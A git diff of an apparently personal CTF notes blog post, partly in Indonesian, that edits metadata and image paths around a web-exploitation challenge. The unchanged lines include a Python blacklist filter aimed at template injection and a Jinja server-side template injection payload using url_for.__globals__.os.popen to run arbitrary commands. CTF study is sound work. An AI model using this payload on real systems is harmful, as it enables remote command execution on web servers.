@@ -3,6 +3,7 @@ title: "My CTF - Notes"
 description: ""
 pubDate: 2025-07-25 10:00
 slug: "ctf-notes"
+category: "Web Exploitation"
 ---
 
 - [Web](#web)
@@ -16,7 +17,7 @@ Ini adalah catetan saya yang dibuat secara personal berdasarkan pengalaman saya 
 
 ada chall ini, diberikan program berikut:
 
-```py
+```py title="security_filter.py"
 def security_filter(user_input):
  blacklist = ["%", "\\", "/", "\"", "'", "`", "|", " ", "[", "]", "+","init", "subprocess", "globlas", "config", "update", "mro", "subclasses",
 "class", "base", "builtins", "cycler", "joiner", "namespace", "lipsum"]
@@ -57,7 +58,7 @@ atau bisa juga
 {{url_for.__globals__.os.popen(request.args.a).read()}}
 ```
 
-![alt text](image-2.png)
+
 
 ---
 
@@ -66,9 +67,9 @@ The regex expression is `/^[0–9a-z ]+$/i`
 - Only numbers and lowercase
 - Key insensitive
 
-![alt text](image.png)
+![alt text](img/image.png)
 
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 ---
 
